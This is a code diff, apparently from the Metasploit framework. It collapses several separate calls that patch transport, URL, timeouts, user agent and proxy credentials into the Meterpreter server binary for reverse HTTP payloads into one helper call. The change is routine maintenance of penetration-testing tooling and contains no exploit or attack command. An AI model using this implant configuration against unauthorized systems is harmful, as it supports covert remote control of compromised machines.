@@ -231,42 +231,22 @@ class ClientCore < Extension
 
     if client.passive_service
 
-      blob.extend(Rex::Payloads::Meterpreter::Patch)
+      blob.extend Rex::Payloads::Meterpreter::Patch
 
-      # Replace the transport string first (TRANSPORT_SOCKET_SSL)
-      blob.patch_transport!(blob, client.ssl)
-
-      # Replace the URL
-      blob.patch_url!(blob, self.client.url)
-
-      # Replace the session expiration timeout
-      blob.patch_expiration!(blob, self.client.expiration)
-
-      # Replace the session communication timeout
-      blob.patch_comm_timeout!(blob, self.client.comm_timeout)
-
-      # Replace the user agent string with our option
-      blob.patch_ua!(
-        blob,
-        client.exploit_datastore['MeterpreterUserAgent'][0,255] + "\x00"
-      )
-
-      # Activate a custom proxy
-      blob.patch_proxy!(
-        blob,
-        client.exploit_datastore['PROXYHOST'],
-        client.exploit_datastore['PROXYPORT'],
-        client.exploit_datastore['PROXY_TYPE']
-      )
-      # Proxy authentication
-      blob.patch_proxy_auth!(
-        blob,
-        client.exploit_datastore['PROXY_USERNAME'],
-        client.exploit_datastore['PROXY_PASSWORD'],
-        client.exploit_datastore['PROXY_TYPE']
-      )
-
-      conn_id = self.client.conn_id
+      #
+      # Patch options into metsrv for reverse HTTP payloads
+      #
+      blob.patch_passive_service! blob,
+        :ssl  =>  client.ssl,
+        :url =>  self.client.url,
+        :expiration  => self.client.expiration,
+        :comm_timeout  =>  self.client.comm_timeout,
+        :ua  =>  client.exploit_datastore['MeterpreterUserAgent'],
+        :proxyhost =>  client.exploit_datastore['PROXYHOST'],
+        :proxyport =>  client.exploit_datastore['PROXYPORT'],
+        :proxy_type  =>  client.exploit_datastore['PROXY_TYPE'],
+        :proxy_username  =>  client.exploit_datastore['PROXY_USERNAME'],
+        :proxy_password  =>  client.exploit_datastore['PROXY_PASSWORD']
 
     end
 
